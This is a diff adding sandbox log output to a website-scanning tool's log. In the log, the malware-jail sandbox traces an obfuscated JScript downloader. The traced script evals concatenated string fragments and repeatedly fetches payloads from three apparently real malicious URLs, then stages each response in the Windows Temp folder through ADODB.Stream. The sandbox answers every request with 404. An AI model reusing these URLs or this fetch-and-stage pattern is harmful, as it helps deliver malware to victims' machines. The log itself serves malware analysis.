@@ -32161,3 +32161,2366 @@ TypeError: Cannot read property 'Quit' of undefined
 [18/05 18:42:05][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js
 [18/05 18:42:05][info]Processing command for NodeJS in folder localhost_05-18_18-42-0005_40A87375 and file localhost_18-42-0005.js
 [18/05 18:42:05][info]Process at 29315 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0005_40A87375.json ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js]
+[18/05 18:42:21][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:06 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:06 - ------------------------
+18 May 18:42:06 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0005_40A87375.json ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js
+18 May 18:42:06 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:06 - Malware files: ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js
+18 May 18:42:06 - Execution timeout set to: 15 seconds
+18 May 18:42:06 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:06 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/
+18 May 18:42:06 - Download from remote server: Return HTTP/404
+18 May 18:42:06 - ==> Preparing Sandbox environment.
+18 May 18:42:06 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:06 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:06 - ==> Executing malware file(s). =========================================
+18 May 18:42:06 -  => Executing: ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js verbosely, reporting silent catches
+18 May 18:42:06 - Saving: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/._malware_localhost_05-18_18-42-0005_40A87375_localhost_18-42-0005.js
+18 May 18:42:06 - Saving: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/tr_._malware_localhost_05-18_18-42-0005_40A87375_localhost_18-42-0005.js
+18 May 18:42:06 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js'
+18 May 18:42:06 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js,xyz'
+18 May 18:42:06 - Calling eval[1]('var Fz1 = "se" + "";??var CDq6 = "clo" + "";??var QEFe5 = "oFile" + "";??var JFRGy = "SaveT" + "";??var HIQf7 = "xt" + "";??var OMXj = "eTe" + "";??var PWq = "writ" + "";??var YXf1 = "open" + "";??var TCAJx = "set" + "";??var IEd0 = "Char" + "";??var ... (truncated)')
+18 May 18:42:06 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:06 - new WScript.Shell[14]
+18 May 18:42:06 - WScript.Shell[14].ExpandEnvironmentStrings(%TEMP%/) => C:\Users\User\AppData\Local\Temp/
+18 May 18:42:06 - WScript.CreateObject(WinHttp.WinHttpRequest.(3114 - 3109).1)
+18 May 18:42:06 - new MSXML2.XMLHTTP[15]
+18 May 18:42:06 - MSXML2.XMLHTTP[15].onreadystatechange = (undefined) 'undefined'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].open(GET,http://tvernedra.ru/nyds9o,false)
+18 May 18:42:06 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].url = (string) 'http://tvernedra.ru/nyds9o'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:06 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:06 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:06 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:06 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:06 - new ADODB_Stream[16]
+18 May 18:42:06 - ADODB_Stream[16].Open()
+18 May 18:42:06 - ADODB_Stream[16].type = (number) '1'
+18 May 18:42:06 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - ADODB_Stream[16].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - ADODB_Stream[16].Write(str) - 27 bytes
+18 May 18:42:06 - ADODB_Stream[16].size = (number) '27'
+18 May 18:42:06 - ADODB_Stream[16].position = (number) '0'
+18 May 18:42:06 - ADODB_Stream[16].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:06 - ADODB_Stream[16].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - ADODB_Stream[16].Close()
+18 May 18:42:06 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:06 - new ADODB_Stream[17]
+18 May 18:42:06 - ADODB_Stream[17].type = (number) '2'
+18 May 18:42:06 - ADODB_Stream[17].charset = (string) '437'
+18 May 18:42:06 - ADODB_Stream[17].Open()
+18 May 18:42:06 - ADODB_Stream[17].type.get() => (number) '2'
+18 May 18:42:06 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:06 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:06 - ADODB_Stream[17].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:06 - ADODB_Stream[17].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:06 - ADODB_Stream[17].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:06 - ADODB_Stream[17].position = (number) '0'
+18 May 18:42:06 - ADODB_Stream[17].Close()
+18 May 18:42:06 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:06 - WScript.Sleep(1000)
+18 May 18:42:07 - MSXML2.XMLHTTP[15].open(GET,http://sreinvestment.com/4qe5s5b,false)
+18 May 18:42:07 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].url = (string) 'http://sreinvestment.com/4qe5s5b'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:07 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:07 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:07 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:07 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:07 - new ADODB_Stream[18]
+18 May 18:42:07 - ADODB_Stream[18].Open()
+18 May 18:42:07 - ADODB_Stream[18].type = (number) '1'
+18 May 18:42:07 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - ADODB_Stream[18].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - ADODB_Stream[18].Write(str) - 27 bytes
+18 May 18:42:07 - ADODB_Stream[18].size = (number) '27'
+18 May 18:42:07 - ADODB_Stream[18].position = (number) '0'
+18 May 18:42:07 - ADODB_Stream[18].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:07 - ADODB_Stream[18].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - ADODB_Stream[18].Close()
+18 May 18:42:07 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:07 - new ADODB_Stream[19]
+18 May 18:42:07 - ADODB_Stream[19].type = (number) '2'
+18 May 18:42:07 - ADODB_Stream[19].charset = (string) '437'
+18 May 18:42:07 - ADODB_Stream[19].Open()
+18 May 18:42:07 - ADODB_Stream[19].type.get() => (number) '2'
+18 May 18:42:07 - ADODB_Stream[19].charset.get() => (string) '437'
+18 May 18:42:07 - ADODB_Stream[19].charset.get() => (string) '437'
+18 May 18:42:07 - ADODB_Stream[19].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - ADODB_Stream[19].charset.get() => (string) '437'
+18 May 18:42:07 - ADODB_Stream[19].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:07 - ADODB_Stream[19].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:07 - ADODB_Stream[19].position = (number) '0'
+18 May 18:42:07 - ADODB_Stream[19].Close()
+18 May 18:42:07 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:07 - WScript.Sleep(1000)
+18 May 18:42:08 - MSXML2.XMLHTTP[15].open(GET,http://diablitos.no/oiyp9,false)
+18 May 18:42:08 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].url = (string) 'http://diablitos.no/oiyp9'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:08 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:08 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:08 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:08 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:08 - new ADODB_Stream[20]
+18 May 18:42:08 - ADODB_Stream[20].Open()
+18 May 18:42:08 - ADODB_Stream[20].type = (number) '1'
+18 May 18:42:08 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - ADODB_Stream[20].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - ADODB_Stream[20].Write(str) - 27 bytes
+18 May 18:42:08 - ADODB_Stream[20].size = (number) '27'
+18 May 18:42:08 - ADODB_Stream[20].position = (number) '0'
+18 May 18:42:08 - ADODB_Stream[20].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:08 - ADODB_Stream[20].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - ADODB_Stream[20].Close()
+18 May 18:42:08 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:08 - new ADODB_Stream[21]
+18 May 18:42:08 - ADODB_Stream[21].type = (number) '2'
+18 May 18:42:08 - ADODB_Stream[21].charset = (string) '437'
+18 May 18:42:08 - ADODB_Stream[21].Open()
+18 May 18:42:08 - ADODB_Stream[21].type.get() => (number) '2'
+18 May 18:42:08 - ADODB_Stream[21].charset.get() => (string) '437'
+18 May 18:42:08 - ADODB_Stream[21].charset.get() => (string) '437'
+18 May 18:42:08 - ADODB_Stream[21].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - ADODB_Stream[21].charset.get() => (string) '437'
+18 May 18:42:08 - ADODB_Stream[21].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:08 - ADODB_Stream[21].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:08 - ADODB_Stream[21].position = (number) '0'
+18 May 18:42:08 - ADODB_Stream[21].Close()
+18 May 18:42:08 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:08 - WScript.Sleep(1000)
+18 May 18:42:09 - WScript.Sleep(1000)
+18 May 18:42:10 - MSXML2.XMLHTTP[15].open(GET,http://tvernedra.ru/nyds9o,false)
+18 May 18:42:10 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].url = (string) 'http://tvernedra.ru/nyds9o'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:10 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:10 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:10 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:10 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:10 - new ADODB_Stream[22]
+18 May 18:42:10 - ADODB_Stream[22].Open()
+18 May 18:42:10 - ADODB_Stream[22].type = (number) '1'
+18 May 18:42:10 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - ADODB_Stream[22].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - ADODB_Stream[22].Write(str) - 27 bytes
+18 May 18:42:10 - ADODB_Stream[22].size = (number) '27'
+18 May 18:42:10 - ADODB_Stream[22].position = (number) '0'
+18 May 18:42:10 - ADODB_Stream[22].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:10 - ADODB_Stream[22].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - ADODB_Stream[22].Close()
+18 May 18:42:10 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:10 - new ADODB_Stream[23]
+18 May 18:42:10 - ADODB_Stream[23].type = (number) '2'
+18 May 18:42:10 - ADODB_Stream[23].charset = (string) '437'
+18 May 18:42:10 - ADODB_Stream[23].Open()
+18 May 18:42:10 - ADODB_Stream[23].type.get() => (number) '2'
+18 May 18:42:10 - ADODB_Stream[23].charset.get() => (string) '437'
+18 May 18:42:10 - ADODB_Stream[23].charset.get() => (string) '437'
+18 May 18:42:10 - ADODB_Stream[23].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - ADODB_Stream[23].charset.get() => (string) '437'
+18 May 18:42:10 - ADODB_Stream[23].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:10 - ADODB_Stream[23].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:10 - ADODB_Stream[23].position = (number) '0'
+18 May 18:42:10 - ADODB_Stream[23].Close()
+18 May 18:42:10 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:10 - WScript.Sleep(1000)
+18 May 18:42:11 - MSXML2.XMLHTTP[15].open(GET,http://sreinvestment.com/4qe5s5b,false)
+18 May 18:42:11 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].url = (string) 'http://sreinvestment.com/4qe5s5b'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:11 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:11 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:11 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:11 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:11 - new ADODB_Stream[24]
+18 May 18:42:11 - ADODB_Stream[24].Open()
+18 May 18:42:11 - ADODB_Stream[24].type = (number) '1'
+18 May 18:42:11 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - ADODB_Stream[24].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - ADODB_Stream[24].Write(str) - 27 bytes
+18 May 18:42:11 - ADODB_Stream[24].size = (number) '27'
+18 May 18:42:11 - ADODB_Stream[24].position = (number) '0'
+18 May 18:42:11 - ADODB_Stream[24].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:11 - ADODB_Stream[24].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - ADODB_Stream[24].Close()
+18 May 18:42:11 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:11 - new ADODB_Stream[25]
+18 May 18:42:11 - ADODB_Stream[25].type = (number) '2'
+18 May 18:42:11 - ADODB_Stream[25].charset = (string) '437'
+18 May 18:42:11 - ADODB_Stream[25].Open()
+18 May 18:42:11 - ADODB_Stream[25].type.get() => (number) '2'
+18 May 18:42:11 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:11 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:11 - ADODB_Stream[25].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - ADODB_Stream[25].charset.get() => (string) '437'
+18 May 18:42:11 - ADODB_Stream[25].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:11 - ADODB_Stream[25].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:11 - ADODB_Stream[25].position = (number) '0'
+18 May 18:42:11 - ADODB_Stream[25].Close()
+18 May 18:42:11 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:11 - WScript.Sleep(1000)
+18 May 18:42:12 - MSXML2.XMLHTTP[15].open(GET,http://diablitos.no/oiyp9,false)
+18 May 18:42:12 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].url = (string) 'http://diablitos.no/oiyp9'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:12 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:12 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:12 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:12 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:12 - new ADODB_Stream[26]
+18 May 18:42:12 - ADODB_Stream[26].Open()
+18 May 18:42:12 - ADODB_Stream[26].type = (number) '1'
+18 May 18:42:12 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - ADODB_Stream[26].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - ADODB_Stream[26].Write(str) - 27 bytes
+18 May 18:42:12 - ADODB_Stream[26].size = (number) '27'
+18 May 18:42:12 - ADODB_Stream[26].position = (number) '0'
+18 May 18:42:12 - ADODB_Stream[26].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:12 - ADODB_Stream[26].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - ADODB_Stream[26].Close()
+18 May 18:42:12 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:12 - new ADODB_Stream[27]
+18 May 18:42:12 - ADODB_Stream[27].type = (number) '2'
+18 May 18:42:12 - ADODB_Stream[27].charset = (string) '437'
+18 May 18:42:12 - ADODB_Stream[27].Open()
+18 May 18:42:12 - ADODB_Stream[27].type.get() => (number) '2'
+18 May 18:42:12 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:12 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:12 - ADODB_Stream[27].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - ADODB_Stream[27].charset.get() => (string) '437'
+18 May 18:42:12 - ADODB_Stream[27].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:12 - ADODB_Stream[27].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:12 - ADODB_Stream[27].position = (number) '0'
+18 May 18:42:12 - ADODB_Stream[27].Close()
+18 May 18:42:12 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:12 - WScript.Sleep(1000)
+18 May 18:42:13 - WScript.Sleep(1000)
+18 May 18:42:14 - MSXML2.XMLHTTP[15].open(GET,http://tvernedra.ru/nyds9o,false)
+18 May 18:42:14 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].url = (string) 'http://tvernedra.ru/nyds9o'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:14 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:14 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:14 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:14 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:14 - new ADODB_Stream[28]
+18 May 18:42:14 - ADODB_Stream[28].Open()
+18 May 18:42:14 - ADODB_Stream[28].type = (number) '1'
+18 May 18:42:14 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - ADODB_Stream[28].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - ADODB_Stream[28].Write(str) - 27 bytes
+18 May 18:42:14 - ADODB_Stream[28].size = (number) '27'
+18 May 18:42:14 - ADODB_Stream[28].position = (number) '0'
+18 May 18:42:14 - ADODB_Stream[28].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:14 - ADODB_Stream[28].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - ADODB_Stream[28].Close()
+18 May 18:42:14 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:14 - new ADODB_Stream[29]
+18 May 18:42:14 - ADODB_Stream[29].type = (number) '2'
+18 May 18:42:14 - ADODB_Stream[29].charset = (string) '437'
+18 May 18:42:14 - ADODB_Stream[29].Open()
+18 May 18:42:14 - ADODB_Stream[29].type.get() => (number) '2'
+18 May 18:42:14 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:14 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:14 - ADODB_Stream[29].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - ADODB_Stream[29].charset.get() => (string) '437'
+18 May 18:42:14 - ADODB_Stream[29].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:14 - ADODB_Stream[29].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
